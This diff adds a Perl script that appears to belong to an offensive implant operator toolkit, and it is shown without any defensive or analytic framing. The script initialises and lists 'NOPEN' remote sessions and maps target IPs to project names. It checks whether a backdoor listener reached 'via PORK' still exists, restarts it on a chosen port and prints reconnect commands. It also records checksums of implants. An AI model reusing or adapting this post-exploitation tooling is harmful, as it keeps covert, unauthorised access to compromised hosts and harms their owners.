@@ -1,0 +1,320 @@
+#!/usr/bin/env perl
+#
+# 20090428 - This file is responsible for printing the didthis-style listing of all currently
+# active NOPEN sessions. It is also responsible for initializing the NOPEN session by reading
+# and executing all of the norc files that have been written out elsewhere.
+#
+$VER="1.0.0.2" ;
+my $reinit=0;
+myinit();
+
+sub dosessioninit {
+  dbg("in autosessioninit, starting up NOPEN session (reinit = =$reinit=)");
+
+  chomp(my $noclientbin = `pschain $nopen_mypid 2>/dev/null | head -1 | awk '{print \$8}'`);
+  $noclientbin = "noclient" unless $noclientbin;
+
+  # Try to find the filename where the script command is preserving our window.
+  my $scriptname = "$optmp/noclientscript.$nopen_mypid";
+  my $nopen_script;
+  if (-e $scriptname) {
+    my $scripted;
+    open(SCRIPTNAME, "$scriptname") or mydie("Unable to open $scriptname: $!\n");
+    $scripted = <SCRIPTNAME>;
+    if ($scripted && ($scripted =~ /$opdown\/script\.[0-9]+/)) {
+      chomp($scripted);
+      #dbg("in autosessioninit, found script filename = =$scripted=");
+      ($nopen_script)=$scripted =~ /\s(\/\S+)/;
+    }
+    close(SCRIPTNAME);
+  }
+
+  if (-e "$optmp/noclient.info.$nopen_mypid" && !$reinit) {
+    dbg("in autosessioninit, not doing anything");
+    return 1;
+  }
+
+  progprint("Initializing NOPEN session\n");
+  if ($reinit) {
+    #dbg("in autosessioninit, deleting existing info at $optmp/noclient.info.$nopen_mypid");
+    `rm -f $optmp/noclient.info.$nopen_mypid`;
+  }
+  my $vars="";
+  #dbg("in autosessioninit, doing creation of source data for $optmp/noclient.info.$nopen_mypid");
+  my @nopen_env = (
+		   "NOPEN_RHOSTNAME",
+		   "NOPEN_SERVERINFO",
+		   "NOPEN_AUTOPORT",
+		   "NOPEN_CLIENTVER",
+		  );
+  $vars="";
+  foreach (@nopen_env) {
+    my $varname = lc $_ ;
+    $vars .= "\$${varname}"."{$nopen_mypid}=\"$ENV{$_}\";\n";
+  }
+  $vars.="\$nopen_mylog"."{$nopen_mypid}=\"$nopen_mylog\";\n";
+  $vars.="\$nopen_myip"."{$nopen_mypid}=\"$nopen_myip\";\n";
+  $vars.="\$nopen_mypid"."{\"$nopen_rhostname\"}=\"$nopen_mypid\";\n";
+  chomp(my $test = `ps hp $nopen_mypid`);
+  unless ($test =~ /localhost/) {
+    ($nopen_connect) = $test =~ /(noclient .*)\s*/ unless /-i \d+/;
+  }
+  my $gotdidthis=0;
+  foreach $didthisfile (split(/\n/,`ls -rt1 $opdown/didthis*`)) {
+    dbg("file=$didthisfile");
+#    if (!$nopen_connect and
+    if (chomp($test = `grep "$nopen_myip" $didthisfile | grep noclient`)) {
+      $test =~ s/\s*$//;
+      $nopen_connect = $test;
+    }
+    if (chomp($test = `grep "$nopen_myip" $didthisfile | grep nstun`)) {
+      $test =~ s/\s*$//;
+      $nopen_connect = $test;
+    }
+    #    if (!$nopen_connect) {
+    if (chomp($test = `grep -A2 " to $nopen_myip" $didthisfile`)) {
+      my ($comment,$nrtun,$call) = split(/\n/,$test);
+      $test = "BOTH $nrtun\n                                              AND $call";
+      $nopen_connect = $test if $nrtun and $call;
+      $vars .= "\$ourtncomment"."{\"$nopen_myip\"} = \"$comment\";\n";
+#     $nopen_connect = $nrtun if (!$call);
+    }
+#    last if $nopen_connect;
+  }
+  $nopen_connect =~ s/\S*noclient/noclient/
+    unless $nopen_connect =~ /BOTH.*AND/;
+  $nopen_connect =~ s/noclient ([\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3})+ /noclient $1:/;
+  $vars.="\$nopen_connect"."{\"$nopen_myip\"}=\"$nopen_connect\" unless \$nopen_connect"."{\"$nopen_myip\"};\n";
+
+  # What project am I?
+  my ($connectip) = $nopen_connect =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/;
+
+  dbg("nopen_connect=$nopen_connect");
+  dbg("connectip=$connectip");
+
+  if ($ENV{PROJECTNAME}) {
+    $projectname{$nopen_myip} = $ENV{PROJECTNAME};
+  } else {
+    my $test;
+    # The "_" in front of $_ here makes sure it's an
+    # exact match to this IP.
+    if ($nopen_myip) {
+      chomp($test = `ls -d $opbin/varkeys/*/*_$nopen_myip 2>/dev/null`);
+      if ($test) {
+	my @howmany = split(/\n/,$test);
+	if (@howmany > 1) {
+	  mywarn("More than one project has IP $nopen_myip in it (using the first one):\n$test\n");
+	  $test = $howmany[0];
+	}
+	($projectname{$nopen_myip}) = $test =~ m,$opbin/varkeys/([^/]+), ;
+      }#$nopen_myip
+    }
+    if ($connectip) {
+      chomp($test = `ls -d $opbin/varkeys/*/*_$connectip 2>/dev/null`);
+      if ($test) {
+	my @howmany = split(/\n/,$test);
+	if (@howmany > 1) {
+	  mywarn("More than one project has IP $connectip in it (using the first one):\n$test\n");
+	  $test = $howmany[0];
+	}
+	($projectname{$connectip}) = $test =~ m,$opbin/varkeys/([^/]+), ;
+      }#$connectip
+    }
+  }
+  $projectname = $projectname{$nopen_myip};
+#  $projectname{$connectip} = $projectname{$nopen_myip}
+#    if ($connectip and ! $projectname{$connectip});
+
+  # Set up this run
+  my ($sec,$min,$hr,$mday,$mon,$year,$wday,$yday,$isdst) = gmtime();
+  $year += 1900 if $year < 1900;
+  $date = $year;
+  $date = ($date*100) + ($mon + 1);
+  $date = ($date*100) + $mday;
+  $date = ($date*100) + $hr;
+  $date = ($date*100) + $min;
+  $date = ($date*100) + $sec;
+  $date = substr("$date",0,8)."-".substr("$date",-6)."Z";
+
+  if ($vars) {
+    #dbg("in autosessioninit, generating $optmp/noclient.info.$nopen_mypid");
+    if ($projectname) {
+      $vars .= "\$projectname"."{\"$nopen_myip\"}=\"$projectname\";\n";
+      $vars .= "\$projectname"."{\"$connectip\"}=\"$projectname{$connectip}\";\n"
+	if ($connectip and !($projectname{$connectip}));
+#      $vars .= "\$projectname=\"$projectname\";\n";
+    } else {
+      $projectname = "???";
+    }
+    $vars.="\$nopen_script"."{\"$nopen_myip\"}=\"$nopen_script\";\n" if ($nopen_script);
+    chomp(my $date = `date +%s`);
+    $date .= " == ".scalar gmtime($date);
+    $date =~ s/(\d{4})$/UTC $1/;
+    $vars .= "\$nopen_initiated"."{\"$nopen_myip\"}=\"$date\";\n";
+    if (open(OUT,"> $optmp/noclient.info.$nopen_mypid")) {
+      print OUT $vars;
+    }
+    print OUT "1;\n";
+    close(OUT);
+    mkdir("$opdown/history/noclient-sessions",oct 0700);
+    copy("$optmp/noclient.info.$nopen_mypid",
+	 "$opdown/history/noclient-sessions");
+    #dbg("in autosessioninit, $optmp/noclient.info.$nopen_mypid generated");
+  }
+  refreshnoclientinfo();
+
+  if (1 or $debug) {
+    my $printout;
+    my (%lastshown,%opposite) = ();
+    $opposite{"noclient"} = "-nstun";
+    $opposite{"-nstun"} = "noclient";
+    my ($port) = ();
+    $printout .= "Current active NOPEN sessions:\n" if (scalar(keys %nopen_rhostname) > 1);
+    foreach (sort by_num keys %nopen_rhostname) {
+      my $tmpproject = $projectname{$nopen_myip{$_}};
+      my ($more,$more2) = ();
+      my ($host) = $nopen_rhostname{$_} =~ /(.*).$nopen_myip{$_}/;
+      my $connect = $nopen_connect{$nopen_myip{$_}};
+      if ($nopen_rhostname eq $nopen_rhostname{$_}) {
+	#dbg("Here we are $nopen_rhostname");
+	if (-e "$optmp/Porklisten.$nopen_rhostname" and
+	   open(SCRIPTIN,"$optmp/Porklisten.$nopen_rhostname")) {
+	  $port = <SCRIPTIN>;
+	  close(SCRIPTIN);
+	}
+      }
+      if ($lastshown{$nopen_myip{$_}} and
+	  $connect eq $lastshown{$nopen_myip{$_}}) {
+	if ($connect =~ /(noclient|-nstun)\s*$nopen_myip{$_}/) {
+	  my $old=$1;
+	  $connect =~ s/$old/$opposite{$old}/;
+	}
+      }
+      $lastshown{$nopen_myip{$_}} = $connect;
+      $connect = $nopen_connect{$nopen_myip{$_}}
+	unless $connect;
+      $more = "\n".
+	"    nopen_autoport =   $nopen_autoport{$_}\n".
+	  "    noclientver    =   $nopen_clientver{$_}"
+	    if ($debug);
+      $more2 = "\n".
+	"    ourtn       =   $ourtncomment{$nopen_myip{$_}}\n".
+	"    NOPEN start = $nopen_initiated{$nopen_myip{$_}}\n"
+	    if ($debug or $verbose);
+      $printout .= sprintf("$COLOR_NOTE
+noclient PID=%s %55s$COLOR_NORMAL
+ hostname = %-15s    connect =$COLOR_FAILURE %s$more$COLOR_NORMAL
+       IP = %-15s serverinfo = %s
+      log = %s$more2
+  \n",
+	     $_,"PROJECT: $tmpproject",$host,$connect,
+	     $nopen_myip{$_},$nopen_serverinfo{$_},
+	     $nopen_mylog{$_});
+    }
+    progprint("$printout\n");
+
+    if ($port) {
+      # Since host we are on was started with PORK and we had a listener at one point,
+      # We want to see if it is still there and if not offer to restart it
+      my ($output,$nopenlines,@output) = doit("netstat -an | grep $port.*LISTEN");
+      if ($output =~ /$port.*LISTEN/) {
+	progprint("${COLOR_FAILURE}CONFIRMED$COLOR_NORMAL: we still have NOPEN server LISTENING:\n$output");
+      } else {
+	my ($ans,$anslong) = mygetinput("$COLOR_FAILURE\n".
+					"NOTE: This host was reached via PORK, and yet there appears to be\n".
+					"      no NOPEN listener at $port any longer. Enter \"Y ###\" to pick a new port.\n".
+					"\n
+Restart it?","Y");
+	if (my ($newport) = $ans =~ /^y\D*(\d*)/i) {
+	  if ($newport > 0 and $newport < 60000) {
+	    $port = $newport;
+	    open(SCRIPTOUT,"> $optmp/Porklisten.$nopen_rhostname");
+	    print SCRIPTOUT $newport;
+	  }
+	  doit("-listen $port");
+	  progprint("\n\nHere's your choice of pastables to connect to it:\n\n".
+		    "\t-nstun $nopen_myip:$port\n".
+		    "\tnoclient $nopen_myip:$port\n".
+		    "");
+	}
+      }
+    }#if port
+  }
+
+  my ($addpath,$mynorc) = ();
+  if (-e $nopen_mynorc) {
+    $mynorc = "-readrc $nopen_mynorc";
+    if (open(IN,$nopen_mynorc)) {
+      while (<IN>) {
+        next unless /alias -mypath=-gs addpath (.*)/;
+        $addpath = $1;
+        $addpath =~ s/\s*$//;
+        nopenaddpath($addpath);
+      }
+      close(IN);
+    }
+  }
+  doit($mynorc) if $mynorc;
+
+  my $sha1sums = "";
+  if (-e "$opup/.sha1sums") {
+    # If this file is here, show it this one time, then move it to $opdown.
+    # This is just for posterity in the logs.
+    $sha1sums = "${COLOR_SUCCESS}\n\n\nsha1sums of implants visible in this build (see $opdown/sha1sums):\n\n";
+    $sha1sums .= `cat $opup/.sha1sums`;
+    $sha1sums .= "\n\n";
+    my $ext = "";
+    while (-e "$opdown/sha1sums$ext") {
+      $ext = ".000" unless $ext;
+      $ext++;
+    }
+    rename("$opup/.sha1sums","$opdown/sha1sums$ext");
+    unless (fork()) {
+      close(STDOUT);
+      close(STDERR);
+      if (open(OUT,">> $opdown/sha1sums$ext")) {
+        print OUT "\n\n\nAnd for posterity, here are sha1 checksums all of up directories in $opdir/:\n\n";
+        foreach (split(/\n/,`find $opdir/ -type d -name up`)) {
+	  print OUT `sha1sum $_/* $_/*/* $_/*/*/* 2>/dev/null | sed "s,/current/,../,g"`;
+        }
+      }
+      close(OUT);
+      exit;
+    }
+  }
+}#dosessioninit
+
+dosessioninit();
+
+# End with true value as we require this script elsewhere.
+1;
+## END MAIN
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs sessioninit @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs sessioninit";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+
+  #dbg("in autosessioninit, argv = =@ARGV=");
+  $reinit = "@ARGV" eq "reinit";
+}
